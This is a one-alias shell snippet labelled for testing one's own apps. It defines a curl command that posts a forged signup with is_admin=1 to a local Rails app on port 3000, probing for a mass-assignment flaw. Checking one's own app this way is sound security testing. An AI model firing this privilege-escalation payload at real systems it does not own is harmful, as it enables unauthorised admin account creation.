# Security aliases. For testing your own apps only.

# Mass-assignment probe: posts a forged is_admin=1 signup to a local Rails app
# to check its strong-params protection. Tied to a user[...] model on :3000.
alias adminaccessoneliner='curl -d "user[login]=hacked&user[is_admin]=1&user[password]=password&user[password_confirmation]=password&user[email]=hacked@by.me" http://localhost:3000/users'
